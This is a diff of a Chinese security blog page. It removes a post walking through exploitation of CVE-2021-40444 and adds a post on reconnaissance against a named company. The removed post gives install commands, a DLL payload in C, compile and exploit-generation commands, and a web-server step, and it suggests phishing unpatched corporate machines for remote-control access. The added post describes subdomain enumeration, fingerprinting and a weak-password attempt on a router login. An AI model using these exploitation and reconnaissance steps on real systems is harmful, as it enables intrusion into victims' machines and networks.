@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CVE-2021-40444 | HackLog</title>
-  <meta name="keywords" content=" 漏洞 ">
-  <meta name="description" content="CVE-2021-40444 | HackLog">
+  <title>信息收集-外网打点(1) | HackLog</title>
+  <meta name="keywords" content=" 信息收集 ">
+  <meta name="description" content="信息收集-外网打点(1) | HackLog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
@@ -326,9 +326,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-5.microsoftvuln" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-8-information" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2021-40444</h1>
+        <h1 class="article-title">信息收集-外网打点(1)</h1>
     
     <div class="article-meta">
         
@@ -338,19 +338,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">漏洞</a>
+            <a class="color5">信息收集</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-09-21 20:36:16'>2021-09-21 18:27</time>
+            发布时间 : <time class="date" title='最后更新: 2021-10-05 23:42:13'>2021-10-05 22:43</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:665</span>
+        <span>字数:567</span>
         
         
         
@@ -358,7 +358,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞利用原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">漏洞利用过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">资产信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#whois"><span class="toc-text">whois</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7"><span class="toc-text">资产</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9"><span class="toc-text">指纹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8A%E8%BF%99%E4%BA%9B%E6%98%AF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%EF%BC%8C%E5%90%8E%E7%BB%AD%E7%9A%84%E5%86%85%E5%AE%B9%E6%8A%BD%E7%A9%BA%E8%BF%98%E4%BC%9A%E6%9B%B4%E6%96%B0%E3%80%82"><span class="toc-text">以上这些是信息收集的一部分内容，后续的内容抽空还会更新。</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -374,71 +374,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></li>
-</ul>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p>前一阵子的微软0day大洞，CVE-2021-40444，之前因为些杂七杂八的事情，错过了好时机，现在来补上。头一次研究这个方向的漏洞，过去都是渗透方面的漏洞，这个应该是属于红队方面的了，而且偏软件类，由于这方面知识储备不足，深层的漏洞原理也只是模糊了解，但不管怎么说，这个漏洞就当作初入这个领域的热身了。</p>
-<p>Microsoft MSHTML的远程代码执行导致可以利用ActiveX进行控制</p>
-<p>以word为例，在word内插入一个由文件创建的对象，选择链接到文件，文件名选择准备好的恶意文件的外部地址，就像挂马一样</p>
-<p>漏洞利用mhtml协议打开远程站点的html文件，而其中包含的JS代码创建ActiveX来下载提前构筑好的cab文件，提取其中的inf文件（DLL）并以CPL执行，最终执行其中的payload。</p>
-<p>软件调试方面的资料有上面的参考。</p>
-<h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>选择用github上的poc</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li>
-</ul>
-<pre><code class="shell">sudo apt-get install lcab
-sudo apt-get install mingw-w64
-</code></pre>
-<p>安装好lcab和编译环境</p>
-<p>制作我们自己想要的dll文件，创建.c文件将想要的payload放进去，比如想要CS上线就把就用CS的payload，我们直接用官方自带的弹计算器的payload。</p>
-<pre><code class="c">#include &lt;windows.h&gt;
-
-void exec(void) &#123;
-    system(&quot;C:\\Windows\\System32\\calc.exe&quot;);
-    return;
-&#125;
-
-BOOL WINAPI DllMain(
-    HINSTANCE hinstDLL,
-    DWORD fdwReason, 
-    LPVOID lpReserved )
-&#123;
-    switch( fdwReason ) 
-    &#123; 
-        case DLL_PROCESS_ATTACH:
-           exec(); 
-           break;
-
-        case DLL_THREAD_ATTACH:
-            break;
-
-        case DLL_THREAD_DETACH:
-            break;
-
-        case DLL_PROCESS_DETACH:
-            break;
-    &#125;
-    return TRUE;
-&#125;
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/1.png"></p>
-<p>然后把他编译为dll文件，并放入test目录</p>
-<pre><code class="shell">i686-w64-mingw32-gcc -shared x.c -o x.dll
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/2.png"></p>
-<p>接下来就运行exploit文件来生成携有恶意JS的html以及cab文件</p>
-<pre><code class="shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址
-</code></pre>
-<p>进入/src开启web服务</p>
-<pre><code class="shell">python3 -m http.server 80
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/3.png"></p>
-<p>再把out目录下生成的或者我们自己添加对象了的恶意word文件在windows打开就可以顺利弹一个计算器出来。如果payload放的是cs的powershell那就直接上线了，对方只要打开word就直接被拿下。</p>
-<p>目前微软已经更新了补丁，但是这招依然可以对不少目标实施攻击，尤其是一些公司内计算机系统，大部分都是老的而且不怎么更新的，进行钓鱼攻击的话直接上线CS再进行内网渗透，扩大战果。</p>
-<hr>
-<center>顺带节日祝福，中秋快乐 </center>
-
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集是非常重要的一环，收集到的信息越多，质量越高，就越能扩大攻击面，还可以针对目标制定战略。今天就以之前minecrack中的星域互联为例子，训练一下信息收集基本功。</p>
+<h2 id="资产信息收集"><a href="#资产信息收集" class="headerlink" title="资产信息收集"></a>资产信息收集</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>查一下他域名的whois信息，网上有很多平台都可以查得到，这里就不多赘述了。</p>
+<p>可以尝试查注册人，邮箱等联系方式，有的查不到，还可以看一下解析记录，数字证书，关联域名等等。</p>
+<p><img src="/posts/qwtyjgxcbszsdg/5.png"></p>
+<h3 id="资产"><a href="#资产" class="headerlink" title="资产"></a>资产</h3><p>可以调查一下有没有app，通过各种app查询平台，类似七麦。还有其他的资产，比如微信小程序，公众号，搜狗搜索微信，天眼查，企查查，爱企查等调查一下注册公司，注册的公众号等等。</p>
+<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>子域名的收集可以很大程度上拓展攻击面，常用的工具有类似挖掘机啊，各种平台啊等等，我选择用强大的oneforall解决，他能查询到的平台以及接口非常全面。</p>
+<p>就先收集星域互联的子域。</p>
+<p><img src="/posts/qwtyjgxcbszsdg/o2.png"></p>
+<p><img src="/posts/qwtyjgxcbszsdg/e4.png"></p>
+<p>发现了很多的子域，但是其中不少是直接被拦截不让访问的，也有不少是错误，我推测这些子域名就是用来给星域的机器挂域名的，之前查询到的关联域名也可以侧面证明了这一观点。</p>
+<p>从中筛选出来存活目标，发现一个路由登录系统。</p>
+<p><img src="/posts/qwtyjgxcbszsdg/a1.png"></p>
+<p>尝试一下弱口令，并没有成功，可以在后续渗透过程中再针对这个目标。</p>
+<h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><p><img src="/posts/qwtyjgxcbszsdg/z3.png"></p>
+<p>有了目标之后，对其进行指纹识别，可以了解目标的cms，框架，web服务器，操作系统，什么语言等等信息。</p>
+<p>由于个人搭建指纹库非常繁琐，并且吃力不讨好，需要时常更新策略，因此首选是通过各种平台接口进行对接，这边用的是bugscaner的api，然后写个程序调用api处理并输出结果保存到文本中。</p>
+<h4 id="以上这些是信息收集的一部分内容，后续的内容抽空还会更新。"><a href="#以上这些是信息收集的一部分内容，后续的内容抽空还会更新。" class="headerlink" title="以上这些是信息收集的一部分内容，后续的内容抽空还会更新。"></a><center>以上这些是信息收集的一部分内容，后续的内容抽空还会更新。</center></h4>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达，点赞有惊喜。 </span>
     </div>
@@ -451,12 +403,12 @@ BOOL WINAPI DllMain(
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2021-40444</p>
-    <p><span class="copy-title">字数:</span><span class="post-count">665</span></p>
+    <p><span class="copy-title">文章标题:</span>信息收集-外网打点(1)</p>
+    <p><span class="copy-title">字数:</span><span class="post-count">567</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Z3rg">Z3rg</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-09-21, 18:27:45</p>
-    <p><span class="copy-title">最后更新:</span>2021-09-21, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/lsqwreoxckl/" title="CVE-2021-40444">https://swertluck.vip/posts/lsqwreoxckl/</a>
+    <p><span class="copy-title">发布时间:</span>2021-10-05, 22:43:44</p>
+    <p><span class="copy-title">最后更新:</span>2021-10-05, 23:42:13</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/qwtyjgxcbszsdg/" title="信息收集-外网打点(1)">https://swertluck.vip/posts/qwtyjgxcbszsdg/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#34;署名-非商用-相同方式共享 4.0&#34;</a> 转载请保留原文链接及作者。
     </p>
